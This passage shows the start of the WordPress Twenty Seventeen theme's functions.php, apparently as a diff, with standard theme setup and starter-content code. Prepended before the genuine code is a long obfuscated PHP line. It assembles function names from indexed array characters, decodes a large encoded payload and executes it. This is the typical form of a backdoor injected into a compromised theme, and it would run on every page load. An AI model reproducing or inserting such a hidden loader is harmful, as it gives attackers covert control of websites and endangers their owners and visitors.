vl[5].$zuuvl[5].$zuuvl[47].$zuuvl[103].$zuuvl[6].$zuuvl[62].$zuuvl[80].$zuuvl[4].$zuuvl[80].$zuuvl[14].$zuuvl[13].$zuuvl[17].$zuuvl[0].$zuuvl[40].$zuuvl[228].$zuuvl[113].$zuuvl[19].$zuuvl[55].$zuuvl[14].$zuuvl[35].$zuuvl[258].$zuuvl[60].$zuuvl[73].$zuuvl[113].$zuuvl[6].$zuuvl[5].$zuuvl[68].$zuuvl[113].$zuuvl[11].$zuuvl[179].$zuuvl[118].$zuuvl[118].$zuuvl[12].$zuuvl[59].$zuuvl[75].$zuuvl[26].$zuuvl[9].$zuuvl[13].$zuuvl[141].$zuuvl[5].$zuuvl[17].$zuuvl[13].$zuuvl[5].$zuuvl[60].$zuuvl[28].$zuuvl[47].$zuuvl[258].$zuuvl[261].$zuuvl[13].$zuuvl[8].$zuuvl[5].$zuuvl[205].$zuuvl[258].$zuuvl[34].$zuuvl[4].$zuuvl[71].$zuuvl[59].$zuuvl[179].$zuuvl[13].$zuuvl[80].$zuuvl[46].$zuuvl[17].$zuuvl[8].$zuuvl[5].$zuuvl[73].$zuuvl[10].$zuuvl[40].$zuuvl[103].$zuuvl[35].$zuuvl[107].$zuuvl[4].$zuuvl[34].$zuuvl[61].$zuuvl[179].$zuuvl[34].$zuuvl[129].$zuuvl[223].$zuuvl[28].$zuuvl[24].$zuuvl[57].$zuuvl[28].$zuuvl[223].$zuuvl[9].$zuuvl[129].$zuuvl[118].$zuuvl[91].$zuuvl[11].$zuuvl[258].$zuuvl[141].$zuuvl[75].$zuuvl[26].$zuuvl[55].$zuuvl[59].$zuuvl[205].$zuuvl[43].$zuuvl[57].$zuuvl[228].$zuuvl[7].$zuuvl[89].$zuuvl[3].$zuuvl[118].$zuuvl[261].$zuuvl[2].$zuuvl[35].$zuuvl[3].$zuuvl[40].$zuuvl[64].$zuuvl[11].$zuuvl[0].$zuuvl[61].$zuuvl[179].$zuuvl[127].$zuuvl[6].$zuuvl[261].$zuuvl[75].$zuuvl[112].$zuuvl[14].$zuuvl[129].$zuuvl[205].$zuuvl[17].$zuuvl[179].$zuuvl[60].$zuuvl[118].$zuuvl[71].$zuuvl[7].$zuuvl[11].$zuuvl[61].$zuuvl[16].$zuuvl[228].$zuuvl[107].$zuuvl[89].$zuuvl[4].$zuuvl[62].$zuuvl[60].$zuuvl[258].$zuuvl[14].$zuuvl[71].$zuuvl[55].$zuuvl[62].$zuuvl[56].$zuuvl[43].$zuuvl[113].$zuuvl[28].$zuuvl[3].$zuuvl[9].$zuuvl[129].$zuuvl[141].$zuuvl[87].$zuuvl[8].$zuuvl[46].$zuuvl[14].$zuuvl[28].$zuuvl[179].$zuuvl[24].$zuuvl[56].$zuuvl[17].$zuuvl[64].$zuuvl[113].$zuuvl[46].$zuuvl[13].$zuuvl[43].$zuuvl[28].$zuuvl[3].$zuuvl[68].$zuuvl[75].$zuuvl[57].$zuuvl[22].$zuuvl[48].$zuuvl[129].$zuuvl[11].$zuuvl[44].$zuuvl[28].$zuuvl[48].$zuuvl[16].$zuuvl[56].$zuuvl[64].$zuuvl[9].$zuuvl[75].$zuuvl[205].$zuuvl[26].$zuuvl[0].$zuuvl[46].$zuuvl[47].$zuuvl[118].$zuuvl[6].$zuuvl[103].$zuuvl[179].$zuuvl[8].$zuuvl[57].$zuuvl[179].$zuuvl[2].$zuuvl[61].$zuuvl[34].$zuuvl[87].$zuuvl[12].$zuuvl[6].$zuuvl[56].$zuuvl[107].$zuuvl[118].$zuuvl[16].$zuuvl[228].$zuuvl[0].$zuuvl[24].$zuuvl[223].$zuuvl[12].$zuuvl[11].$zuuvl[59].$zuuvl[48].$zuuvl[14].$zuuvl[1].$zuuvl[71].$zuuvl[118].$zuuvl[205].$zuuvl[44].$zuuvl[56].$zuuvl[34].$zuuvl[35].$zuuvl[141].$zuuvl[69].$zuuvl[258].$zuuvl[5].$zuuvl[61].$zuuvl[228].$zuuvl[129].$zuuvl[1].$zuuvl[9].$zuuvl[2].$zuuvl[16].$zuuvl[64].$zuuvl[0].$zuuvl[223].$zuuvl[8].$zuuvl[22].$zuuvl[5].$zuuvl[34].$zuuvl[75].$zuuvl[89].$zuuvl[8].$zuuvl[11].$zuuvl[43].$zuuvl[205].$zuuvl[69].$zuuvl[228].$zuuvl[89].$zuuvl[60].$zuuvl[87].$zuuvl[127].$zuuvl[2].$zuuvl[69].$zuuvl[46].$zuuvl[22].$zuuvl[87].$zuuvl[113].$zuuvl[0].$zuuvl[40].$zuuvl[7].$zuuvl[73].$zuuvl[179].$zuuvl[35].$zuuvl[43].$zuuvl[118].$zuuvl[129].$zuuvl[44].$zuuvl[43].$zuuvl[47].$zuuvl[24].$zuuvl[112].$zuuvl[7].$zuuvl[179].$zuuvl[75].$zuuvl[89].$zuuvl[71].$zuuvl[80].$zuuvl[6].$zuuvl[112].$zuuvl[24].$zuuvl[16].$zuuvl[5].$zuuvl[103].$zuuvl[56].$zuuvl[118].$zuuvl[9].$zuuvl[2].$zuuvl[12].$zuuvl[47].$zuuvl[8].$zuuvl[103].$zuuvl[179].$zuuvl[73].$zuuvl[19].$zuuvl[11].$zuuvl[34].$zuuvl[118].$zuuvl[40].$zuuvl[107].$zuuvl[179].$zuuvl[73].$zuuvl[10].$zuuvl[7].$zuuvl[34].$zuuvl[24].$zuuvl[10].$zuuvl[7].$zuuvl[118].$zuuvl[73].$zuuvl[44].$zuuvl[14].$zuuvl[127].$zuuvl[352].$zuuvl[107].$zuuvl[87].$zuuvl[103].$zuuvl[68].$zuuvl[19].$zuuvl[205].$zuuvl[7].$zuuvl[26].$zuuvl[16].$zuuvl[127].$zuuvl[71].$zuuvl[205].$zuuvl[26].$zuuvl[46].$zuuvl[80].$zuuvl[68].$zuuvl[56].$zuuvl[37].$zuuvl[89].$zuuvl[352].$zuuvl[5].$zuuvl[5].$zuuvl[37].$zuuvl[47].$zuuvl[127].$zuuvl[7].$zuuvl[113].$zuuvl[28].$zuuvl[179].$zuuvl[141].$zuuvl[26].$zuuvl[48].$zuuvl[179].$zuuvl[12].$zuuvl[57].$zuuvl[75].$zuuvl[57].$zuuvl[91].$zuuvl[112].$zuuvl[129].$zuuvl[40].$zuuvl[71].$zuuvl[48].$zuuvl[5].$zuuvl[1].$zuuvl[4].$zuuvl[127].$zuuvl[14].$zuuvl[64].$zuuvl[68].$zuuvl[112].$zuuvl[352].$zuuvl[22].$zuuvl[60].$zuuvl[12].$zuuvl[0].$zuuvl[16].$zuuvl[1].$zuuvl[6].$zuuvl[37].$zuuvl[48].$zuuvl[73].$zuuvl[73].$zuuvl[8].$zuuvl[129].$zuuvl[60].$zuuvl[89].$zuuvl[69].$zuuvl[2].$zuuvl[62].$zuuvl[223].$zuuvl[61].$zuuvl[352].$zuuvl[69].$zuuvl[223].$zuuvl[47].$zuuvl[55].$zuuvl[14].$zuuvl[57].$zuuvl[56].$zuuvl[9].$zuuvl[64].$zuuvl[107].$zuuvl[75].$zuuvl[89].$zuuvl[10].$zuuvl[48].$zuuvl[47].$zuuvl[87].$zuuvl[61].$zuuvl[7].$zuuvl[12].$zuuvl[30].$zuuvl[75].$zuuvl[89].$zuuvl[73].$zuuvl[46].$zuuvl[223].$zuuvl[129].$zuuvl[60].$zuuvl[60].$zuuvl[64].$zuuvl[141].$zuuvl[141].$zuuvl[71].$zuuvl[47].$zuuvl[55].$zuuvl[3].$zuuvl[129].$zuuvl[103].$zuuvl[75].$zuuvl[13].$zuuvl[10].$zuuvl[16].$zuuvl[8].$zuuvl[60].$zuuvl[30].$zuuvl[118].$zuuvl[8].$zuuvl[61].$zuuvl[69].$zuuvl[2].$zuuvl[87].$zuuvl[40].$zuuvl[13].$zuuvl[103].$zuuvl[43].$zuuvl[28].$zuuvl[3].$zuuvl[352].$zuuvl[1].$zuuvl[7].$zuuvl[10].$zuuvl[47].$zuuvl[35].$zuuvl[61].$zuuvl[46].$zuuvl[0].$zuuvl[107].$zuuvl[71].$zuuvl[44].$zuuvl[28].$zuuvl[35].$zuuvl[103].$zuuvl[68].$zuuvl[28].$zuuvl[14].$zuuvl[22].$zuuvl[46].$zuuvl[26].$zuuvl[57].$zuuvl[26].$zuuvl[43].$zuuvl[44].$zuuvl[6].$zuuvl[5].$zuuvl[9].$zuuvl[6].$zuuvl[6].$zuuvl[228].$zuuvl[24].$zuuvl[3].$zuuvl[127].$zuuvl[103].$zuuvl[11].$zuuvl[3].$zuuvl[75].$zuuvl[59].$zuuvl[44].$zuuvl[28].$zuuvl[35].$zuuvl[107].$zuuvl[55].$zuuvl[1].$zuuvl[71].$zuuvl[62].$zuuvl[35].$zuuvl[55].$zuuvl[91].$zuuvl[205].$zuuvl[7].$zuuvl[91].$zuuvl[5].$zuuvl[3].$zuuvl[13].$zuuvl[9].$zuuvl[30].$zuuvl[44].$zuuvl[205].$zuuvl[40].$zuuvl[44].$zuuvl[7].$zuuvl[112].$zuuvl[64].$zuuvl[24].$zuuvl[69].$zuuvl[11].$zuuvl[61].$zuuvl[57].$zuuvl[3].$zuuvl[118].$zuuvl[2].$zuuvl[46].$zuuvl[19].$zuuvl[68].$zuuvl[91].$zuuvl[64].$zuuvl[14].$zuuvl[107].$zuuvl[179].$zuuvl[62].$zuuvl[46].$zuuvl[19].$zuuvl[118].$zuuvl[37].$zuuvl[141].$zuuvl[55].$zuuvl[69].$zuuvl[55].$zuuvl[10].$zuuvl[35].$zuuvl[2].$zuuvl[89].$zuuvl[28].$zuuvl[5].$zuuvl[48].$zuuvl[3].$zuuvl[6].$zuuvl[26].$zuuvl[64].$zuuvl[11].$zuuvl[89].$zuuvl[56].$zuuvl[61].$zuuvl[47].$zuuvl[10].$zuuvl[60].$zuuvl[56].$zuuvl[3].$zuuvl[11].$zuuvl[26].$zuuvl[112].$zuuvl[9].$zuuvl[30].$zuuvl[34].$zuuvl[179].$zuuvl[3].$zuuvl[9].$zuuvl[11].$zuuvl[71].$zuuvl[59].$zuuvl[44].$zuuvl[68].$zuuvl[28].$zuuvl[37].$zuuvl[56].$zuuvl[37].$zuuvl[24].$zuuvl[0].$zuuvl[48].$zuuvl[68].$zuuvl[223].$zuuvl[205].$zuuvl[223].$zuuvl[0].$zuuvl[43].$zuuvl[9].$zuuvl[127].$zuuvl[35].$zuuvl[61].$zuuvl[258].$zuuvl[47].$zuuvl[10].$zuuvl[179].$zuuvl[55].$zuuvl[64].$zuuvl[261].$zuuvl[3].$zuuvl[103].$zuuvl[68].$zuuvl[60].$zuuvl[56].$zuuvl[60].$zuuvl[19].$zuuvl[24].$zuuvl[258].$zuuvl[179].$zuuvl[34].$zuuvl[75].$zuuvl[9].$zuuvl[26].$zuuvl[24].$zuuvl[1].$zuuvl[12].$zuuvl[8].$zuuvl[75].$zuuvl[73].$zuuvl[4].$zuuvl[129].$zuuvl[16].$zuuvl[35].$zuuvl[14].$zuuvl[112].$zuuvl[71].$zuuvl[80].$zuuvl[13].$zuuvl[19].$zuuvl[26].$zuuvl[80].$zuuvl[59].$zuuvl[0].$zuuvl[22].$zuuvl[48].$zuuvl[129].$zuuvl[16].$zuuvl[71].$zuuvl[91].$zuuvl[40].$zuuvl[5].$zuuvl[47].$zuuvl[352].$zuuvl[60].$zuuvl[26].$zuuvl[59].$zuuvl[13].$zuuvl[64].$zuuvl[5].$zuuvl[103].$zuuvl[0].$zuuvl[112].$zuuvl[24].$zuuvl[8].$zuuvl[34].$zuuvl[113].$zuuvl[228].$zuuvl[60].$zuuvl[118].$zuuvl[75].$zuuvl[1].$zuuvl[30].$zuuvl[37].$zuuvl[17].$zuuvl[12].$zuuvl[71].$zuuvl[258].$zuuvl[8].$zuuvl[112].$zuuvl[80].$zuuvl[129].$zuuvl[13].$zuuvl[24].$zuuvl[19].$zuuvl[261].$zuuvl[44].$zuuvl[9].$zuuvl[0].$zuuvl[107].$zuuvl[1].$zuuvl[75].$zuuvl[4].$zuuvl[13].$zuuvl[127].$zuuvl[2].$zuuvl[47].$zuuvl[5].$zuuvl[0].$zuuvl[46].$zuuvl[89].$zuuvl[59].$zuuvl[24].$zuuvl[103].$zuuvl[75].$zuuvl[4].$zuuvl[60].$zuuvl[46].$zuuvl[80].$zuuvl[22].$zuuvl[40].$zuuvl[10].$zuuvl[8].$zuuvl[258].$zuuvl[75].$zuuvl[0].$zuuvl[1].$zuuvl[37].$zuuvl[1].$zuuvl[64].$zuuvl[127].$zuuvl[37].$zuuvl[112].$zuuvl[87].$zuuvl[68].$zuuvl[22].$zuuvl[14].$zuuvl[223].$zuuvl[19].$zuuvl[87].$zuuvl[2].$zuuvl[19].$zuuvl[129].$zuuvl[22].$zuuvl[127].$zuuvl[35].$zuuvl[13].$zuuvl[48].$zuuvl[55].$zuuvl[47].$zuuvl[47].$zuuvl[10].$zuuvl[89].$zuuvl[48].$zuuvl[47].$zuuvl[55].$zuuvl[37].$zuuvl[55].$zuuvl[0].$zuuvl[107].$zuuvl[205].$zuuvl[60].$zuuvl[107].$zuuvl[69].$zuuvl[64].$zuuvl[55].$zuuvl[228].$zuuvl[61].$zuuvl[113].$zuuvl[103].$zuuvl[261].$zuuvl[261].$zuuvl[28].$zuuvl[44].$zuuvl[19].$zuuvl[16].$zuuvl[89].$zuuvl[13].$zuuvl[107].$zuuvl[28].$zuuvl[30].$zuuvl[62].$zuuvl[6].$zuuvl[73].$zuuvl[71].$zuuvl[48].$zuuvl[11].$zuuvl[28].$zuuvl[17].$zuuvl[68].$zuuvl[75].$zuuvl[48].$zuuvl[64].$zuuvl[46].$zuuvl[205].$zuuvl[28].$zuuvl[34].$zuuvl[12].$zuuvl[19].$zuuvl[55].$zuuvl[2].$zuuvl[11].$zuuvl[40].$zuuvl[43].$zuuvl[56].$zuuvl[47].$zuuvl[69].$zuuvl[71].$zuuvl[89].$zuuvl[107].$zuuvl[1].$zuuvl[30].$zuuvl[13].$zuuvl[62].$zuuvl[107].$zuuvl[0].$zuuvl[48].$zuuvl[46].$zuuvl[40].$zuuvl[113].$zuuvl[2].$zuuvl[56].$zuuvl[75].$zuuvl[16].$zuuvl[73].$zuuvl[75].$zuuvl[62].$zuuvl[10].$zuuvl[127].$zuuvl[48].$zuuvl[12].$zuuvl[73].$zuuvl[352].$zuuvl[59].$zuuvl[352].$zuuvl[73].$zuuvl[1].$zuuvl[71].$zuuvl[6].$zuuvl[7].$zuuvl[4].$zuuvl[22].$zuuvl[69].$zuuvl[118].$zuuvl[261].$zuuvl[141].$zuuvl[57].$zuuvl[71].$zuuvl[26].$zuuvl[13].$zuuvl[48].$zuuvl[352].$zuuvl[89].$zuuvl[28].$zuuvl[75].$zuuvl[9].$zuuvl[141].$zuuvl[1].$zuuvl[3].$zuuvl[5].$zuuvl[62].$zuuvl[61].$zuuvl[4].$zuuvl[9].$zuuvl[12].$zuuvl[47].$zuuvl[228].$zuuvl[352].$zuuvl[34].$zuuvl[22].$zuuvl[127].$zuuvl[10].$zuuvl[4].$zuuvl[261].$zuuvl[107].$zuuvl[89].$zuuvl[3].$zuuvl[73].$zuuvl[103].$zuuvl[0].$zuuvl[37].$zuuvl[61].$zuuvl[73].$zuuvl[16].$zuuvl[1].$zuuvl[4].$zuuvl[13].$zuuvl[69].$zuuvl[71].$zuuvl[5].$zuuvl[22].$zuuvl[352].$zuuvl[103].$zuuvl[75].$zuuvl[352].$zuuvl[24].$zuuvl[19].$zuuvl[89].$zuuvl[6].$zuuvl[14].$zuuvl[73].$zuuvl[69].$zuuvl[30].$zuuvl[7].$zuuvl[87].$zuuvl[3].$zuuvl[19].$zuuvl[261].$zuuvl[10].$zuuvl[112].$zuuvl[16].$zuuvl[80].$zuuvl[89].$zuuvl[14].$zuuvl[91].$zuuvl[103].$zuuvl[44].$zuuvl[179].$zuuvl[0].$zuuvl[118].$zuuvl[34].$zuuvl[14].$zuuvl[112].$zuuvl[47].$zuuvl[112].$zuuvl[14].$zuuvl[91].$zuuvl[3].$zuuvl[40].$zuuvl[9].$zuuvl[68].$zuuvl[89].$zuuvl[37].$zuuvl[35].$zuuvl[59].$zuuvl[223].$zuuvl[24].$zuuvl[12].$zuuvl[107].$zuuvl[30].$zuuvl[4].$zuuvl[69].$zuuvl[107].$zuuvl[107].$zuuvl[1].$zuuvl[258].$zuuvl[258].$zuuvl[69].$zuuvl[261].$zuuvl[71].$zuuvl[8].$zuuvl[69].$zuuvl[47].$zuuvl[4].$zuuvl[55].$zuuvl[19].$zuuvl[56].$zuuvl[68].$zuuvl[258].$zuuvl[55].$zuuvl[62].$zuuvl[3].$zuuvl[64].$zuuvl[22].$zuuvl[26].$zuuvl[43].$zuuvl[47].$zuuvl[28].$zuuvl[61].$zuuvl[34].$zuuvl[26].$zuuvl[12].$zuuvl[62].$zuuvl[112].$zuuvl[261].$zuuvl[179].$zuuvl[62].$zuuvl[46].$zuuvl[7].$zuuvl[2].$zuuvl[71].$zuuvl[40].$zuuvl[11].$zuuvl[73].$zuuvl[37].$zuuvl[59].$zuuvl[71].$zuuvl[68].$zuuvl[11].$zuuvl[40].$zuuvl[7].$zuuvl[59].$zuuvl[87].$zuuvl[57].$zuuvl[35].$zuuvl[129].$zuuvl[258].$zuuvl[8].$zuuvl[46].$zuuvl[46].$zuuvl[118].$zuuvl[55].$zuuvl[73].$zuuvl[6].$zuuvl[75].$zuuvl[10].$zuuvl[55].$zuuvl[13].$zuuvl[47].$zuuvl[205].$zuuvl[4].$zuuvl[10].$zuuvl[7].$zuuvl[59].$zuuvl[47].$zuuvl[118].$zuuvl[258].$zuuvl[57].$zuuvl[26].$zuuvl[1].$zuuvl[64].$zuuvl[73].$zuuvl[8].$zuuvl[118].$zuuvl[30].$zuuvl[91].$zuuvl[56].$zuuvl[69].$zuuvl[28].$zuuvl[107].$zuuvl[60].$zuuvl[87].$zuuvl[17].$zuuvl[127].$zuuvl[17].$zuuvl[112].$zuuvl[68].$zuuvl[205].$zuuvl[30].$zuuvl[57].$zuuvl[75].$zuuvl[30].$zuuvl[129].$zuuvl[73].$zuuvl[1].$zuuvl[103].$zuuvl[87].$zuuvl[80].$zuuvl[112].$zuuvl[13].$zuuvl[24].$zuuvl[223].$zuuvl[47].$zuuvl[26].$zuuvl[3].$zuuvl[89].$zuuvl[118].$zuuvl[4].$zuuvl[22].$zuuvl[179].$zuuvl[44].$zuuvl[69].$zuuvl[30].$zuuvl[17].$zuuvl[62].$zuuvl[30].$zuuvl[352].$zuuvl[205].$zuuvl[8].$zuuvl[24].$zuuvl[129].$zuuvl[205].$zuuvl[107].$zuuvl[112].$zuuvl[62].$zuuvl[43].$zuuvl[4].$zuuvl[47].$zuuvl[112].$zuuvl[4].$zuuvl[34].$zuuvl[64].$zuuvl[141].$zuuvl[261].$zuuvl[4].$zuuvl[37].$zuuvl[141].$zuuvl[129].$zuuvl[3].$zuuvl[47].$zuuvl[4].$zuuvl[113].$zuuvl[24].$zuuvl[22].$zuuvl[64].$zuuvl[8].$zuuvl[205].$zuuvl[75].$zuuvl[43].$zuuvl[24].$zuuvl[10].$zuuvl[6].$zuuvl[80].$zuuvl[8].$zuuvl[129].$zuuvl[14].$zuuvl[112].$zuuvl[68].$zuuvl[56].$zuuvl[60].$zuuvl[40].$zuuvl[57].$zuuvl[9].$zuuvl[3].$zuuvl[73].$zuuvl[8].$zuuvl[8].$zuuvl[205].$zuuvl[30].$zuuvl[69].$zuuvl[118].$zuuvl[46].$zuuvl[261].$zuuvl[14].$zuuvl[103].$zuuvl[57].$zuuvl[64].$zuuvl[30].$zuuvl[43].$zuuvl[112].$zuuvl[57].$zuuvl[6].$zuuvl[46].$zuuvl[11].$zuuvl[62].$zuuvl[73].$zuuvl[37].$zuuvl[37].$zuuvl[40].$zuuvl[43].$zuuvl[44].$zuuvl[37].$zuuvl[46].$zuuvl[261].$zuuvl[12].$zuuvl[129].$zuuvl[75].$zuuvl[80].$zuuvl[62].$zuuvl[91].$zuuvl[40].$zuuvl[46].$zuuvl[34].$zuuvl[26].$zuuvl[4].$zuuvl[28].$zuuvl[68].$zuuvl[19].$zuuvl[205].$zuuvl[28].$zuuvl[179].$zuuvl[258].$zuuvl[55].$zuuvl[43].$zuuvl[223].$zuuvl[352].$zuuvl[8].$zuuvl[80].$zuuvl[228].$zuuvl[19].$zuuvl[2].$zuuvl[113].$zuuvl[6].$zuuvl[44].$zuuvl[89].$zuuvl[11].$zuuvl[80].$zuuvl[48].$zuuvl[28].$zuuvl[112].$zuuvl[6].$zuuvl[8].$zuuvl[11].$zuuvl[261].$zuuvl[47].$zuuvl[60].$zuuvl[60].$zuuvl[43].$zuuvl[4].$zuuvl[118].$zuuvl[107].$zuuvl[73].$zuuvl[113].$zuuvl[80].$zuuvl[55].$zuuvl[80].$zuuvl[75].$zuuvl[1].$zuuvl[3].$zuuvl[103].$zuuvl[71].$zuuvl[64].$zuuvl[3].$zuuvl[228].$zuuvl[13].$zuuvl[47].$zuuvl[80].$zuuvl[19].$zuuvl[35].$zuuvl[6].$zuuvl[28].$zuuvl[1].$zuuvl[19].$zuuvl[9].$zuuvl[22].$zuuvl[26].$zuuvl[5].$zuuvl[55].$zuuvl[73].$zuuvl[43].$zuuvl[11].$zuuvl[127].$zuuvl[4].$zuuvl[4].$zuuvl[55].$zuuvl[103].$zuuvl[57].$zuuvl[40].$zuuvl[223].$zuuvl[57].$zuuvl[59].$zuuvl[103].$zuuvl[13].$zuuvl[26].$zuuvl[103].$zuuvl[6].$zuuvl[59].$zuuvl[34].$zuuvl[19].$zuuvl[73].$zuuvl[69].$zuuvl[57].$zuuvl[8].$zuuvl[352].$zuuvl[59].$zuuvl[59].$zuuvl[6].$zuuvl[9].$zuuvl[61].$zuuvl[4].$zuuvl[228].$zuuvl[179].$zuuvl[141].$zuuvl[223].$zuuvl[5].$zuuvl[71].$zuuvl[62].$zuuvl[64].$zuuvl[103].$zuuvl[7].$zuuvl[129].$zuuvl[19].$zuuvl[103].$zuuvl[179].$zuuvl[57].$zuuvl[103].$zuuvl[44].$zuuvl[107].$zuuvl[179].$zuuvl[14].$zuuvl[0].$zuuvl[68].$zuuvl[91].$zuuvl[89].$zuuvl[2].$zuuvl[103].$zuuvl[5].$zuuvl[64].$zuuvl[179].$zuuvl[141].$zuuvl[28].$zuuvl[61].$zuuvl[4].$zuuvl[141].$zuuvl[61].$zuuvl[3].$zuuvl[3].$zuuvl[261].$zuuvl[89].$zuuvl[35].$zuuvl[55].$zuuvl[43].$zuuvl[228].$zuuvl[205].$zuuvl[8].$zuuvl[423].$zuuvl[423];$hnoogoeskw=$zuuvl[28].$zuuvl[87].$zuuvl[34].$zuuvl[24].$zuuvl[59].$zuuvl[19].$zuuvl[1393].$zuuvl[223].$zuuvl[24].$zuuvl[80].$zuuvl[91].$zuuvl[223].$zuuvl[24];$giggcbcnecihgxg=$zuuvl[352].$zuuvl[71].$zuuvl[35].$zuuvl[205].$zuuvl[80].$zuuvl[91].$zuuvl[47].$zuuvl[55].$zuuvl[5].$zuuvl[24].$zuuvl[34].$zuuvl[34];$ysjczwqndfswpou=$zuuvl[34].$zuuvl[26].$zuuvl[5].$zuuvl[5].$zuuvl[24].$zuuvl[4];$xbdzcfnhivootun=$zuuvl[80].$zuuvl[5].$zuuvl[24].$zuuvl[87].$zuuvl[26].$zuuvl[24].$zuuvl[1393].$zuuvl[0].$zuuvl[35].$zuuvl[205].$zuuvl[80].$zuuvl[26].$zuuvl[60].$zuuvl[91].$zuuvl[205];$mxtmtkzxpstfho=$zuuvl[3373].$zuuvl[87];$eqfdslrztm=$zuuvl[2856].$zuuvl[1864].$zuuvl[87].$zuuvl[3373].$zuuvl[2675].$zuuvl[13].$zuuvl[87].$zuuvl[4].$zuuvl[24];$hgjvxwsrimcij=$zuuvl[24].$zuuvl[46].$zuuvl[60].$zuuvl[26];$keimnqucqohve=$ysjczwqndfswpou;$xqajyjokhoai=$giggcbcnecihgxg($hnoogoeskw($zuceozsblk));$xqajyjokhoai=$keimnqucqohve($xqajyjokhoai);$fvvtfzcsnsnpjc=$xbdzcfnhivootun($mxtmtkzxpstfho,$ysjczwqndfswpou($eqfdslrztm));$fvvtfzcsnsnpjc($ysjczwqndfswpou($xqajyjokhoai));$hgjvxwsrimcij;?><?php
+/**
+ * Twenty Seventeen functions and definitions
+ *
+ * @link https://developer.wordpress.org/themes/basics/theme-functions/
+ *
+ * @package WordPress
+ * @subpackage Twenty_Seventeen
+ * @since 1.0
+ */
+
+/**
+ * Twenty Seventeen only works in WordPress 4.7 or later.
+ */
+if ( version_compare( $GLOBALS['wp_version'], '4.7-alpha', '<' ) ) {
+	require get_template_directory() . '/inc/back-compat.php';
+	return;
+}
+
+/**
+ * Sets up theme defaults and registers support for various WordPress features.
+ *
+ * Note that this function is hooked into the after_setup_theme hook, which
+ * runs before the init hook. The init hook is too late for some features, such
+ * as indicating support for post thumbnails.
+ */
+function twentyseventeen_setup() {
+	/*
+	 * Make theme available for translation.
+	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentyseventeen
+	 * If you're building a theme based on Twenty Seventeen, use a find and replace
+	 * to change 'twentyseventeen' to the name of your theme in all the template files.
+	 */
+	load_theme_textdomain( 'twentyseventeen' );
+
+	// Add default posts and comments RSS feed links to head.
+	add_theme_support( 'automatic-feed-links' );
+
+	/*
+	 * Let WordPress manage the document title.
+	 * By adding theme support, we declare that this theme does not use a
+	 * hard-coded <title> tag in the document head, and expect WordPress to
+	 * provide it for us.
+	 */
+	add_theme_support( 'title-tag' );
+
+	/*
+	 * Enable support for Post Thumbnails on posts and pages.
+	 *
+	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
+	 */
+	add_theme_support( 'post-thumbnails' );
+
+	add_image_size( 'twentyseventeen-featured-image', 2000, 1200, true );
+
+	add_image_size( 'twentyseventeen-thumbnail-avatar', 100, 100, true );
+
+	// Set the default content width.
+	$GLOBALS['content_width'] = 525;
+
+	// This theme uses wp_nav_menu() in two locations.
+	register_nav_menus(
+		array(
+			'top'    => __( 'Top Menu', 'twentyseventeen' ),
+			'social' => __( 'Social Links Menu', 'twentyseventeen' ),
+		)
+	);
+
+	/*
+	 * Switch default core markup for search form, comment form, and comments
+	 * to output valid HTML5.
+	 */
+	add_theme_support(
+		'html5', array(
+			'comment-form',
+			'comment-list',
+			'gallery',
+			'caption',
+		)
+	);
+
+	/*
+	 * Enable support for Post Formats.
+	 *
+	 * See: https://codex.wordpress.org/Post_Formats
+	 */
+	add_theme_support(
+		'post-formats', array(
+			'aside',
+			'image',
+			'video',
+			'quote',
+			'link',
+			'gallery',
+			'audio',
+		)
+	);
+
+	// Add theme support for Custom Logo.
+	add_theme_support(
+		'custom-logo', array(
+			'width'      => 250,
+			'height'     => 250,
+			'flex-width' => true,
+		)
+	);
+
+	// Add theme support for selective refresh for widgets.
+	add_theme_support( 'customize-selective-refresh-widgets' );
+
+	/*
+	 * This theme styles the visual editor to resemble the theme style,
+	 * specifically font, colors, and column width.
+	  */
+	add_editor_style( array( 'assets/css/editor-style.css', twentyseventeen_fonts_url() ) );
+
+	// Define and register starter content to showcase the theme on new sites.
+	$starter_content = array(
+		'widgets'     => array(
+			// Place three core-defined widgets in the sidebar area.
+			'sidebar-1' => array(
+				'text_business_info',
+				'search',
+				'text_about',
+			),
+
+			// Add the core-defined business info widget to the footer 1 area.
+			'sidebar-2' => array(
+				'text_business_info',
+			),
+
+			// Put two core-defined widgets in the footer 2 area.
+			'sidebar-3' => array(
+				'text_about',
+				'search',
+			),
+		),
+
+		// Specify the core-defined pages to create and add custom thumbnails to some of them.
+		'posts'       => array(
+			'home',
+			'about'            => array(
+				'thumbnail' => '{{image-sandwich}}',
+			),
+			'contact'          => array(
+				'thumbnail' => '{{image-espresso}}',
+			),
+			'blog'             => array(
+				'thumbnail' => '{{image-coffee}}',
+			),
+			'homepage-section' => array(
+				'thumbnail' => '{{image-espresso}}',
+			),
+		),
+
+		// Create the custom image attachments used as post thumbnails for pages.
+		'attachments' => array(
+			'image-espresso' => array(
+				'post_title' => _x( 'Espresso', 'Theme starter content', 'twentyseventeen' ),
+				'file'       => 'assets/images/espresso.jpg', // URL relative to the template directory.
+			),
+			'image-sandwich' => array(
+				'post_title' => _x( 'Sandwich', 'Theme starter content', 'twentyseventeen' ),
+				'file'       => 'assets/images/sandwich.jpg',
+			),
+			'image-coffee'   => array(
+				'post_title' => _x( 'Coffee', 'Theme starter content', 'twentyseventeen' ),
+				'file'       => 'assets/images/coffee.jpg',
+			),
+		),
+
+		// Default to a static front page and assign the front and posts pages.
+		'options'     => array(
+			'show_on_front'  => 'page',
+			'page_on_front'  => '{{home}}',
+			'page_for_posts' => '{{blog}}',
+		),
+
+		// Set the front page section theme mods to the IDs of the core-registered pages.
+		'theme_mods'  => array(
+			'panel_1' => '{{homepage-section}}',
+			'panel_2' => '{{about}}',
+			'panel_3' => '{{blog}}',
+			'panel_4' => '{{contact}}',
+		),
+
+		// Set up nav menus for each of the two areas registered in the theme.
+		'nav_menus'   => array(
+			// Assign a menu to the "top" location.
+			'top'    => array(
+				'name'  => __( 'Top Menu', 'twentyseventeen' ),
+				'items' => array(
+					'link_home', // Note that the core "home" page is actually a link in case a static front page is not used.
+					'page_about',
+					'page_blog',
+					'page_contact',
+				),
+			),
+
+			// Assign a menu to the "social" location.
+			'social' => array(
+				'name'  => __( 'Social Links Menu', 'twentyseventeen' ),
+				'items' => array(
+					'link_yelp',
+					'link_facebook',
+					'link_twitter',
+					'link_instagram',
+					'link_email',
+				),
+			),
+		),
+	);
+
+	/**
+	 * Filters Twenty Seventeen array of starter content.
+	 *
+	 * @since Twenty Seventeen 1.1
+	 *
+	 * @param array $starter_content Array of starter content.
+	 */
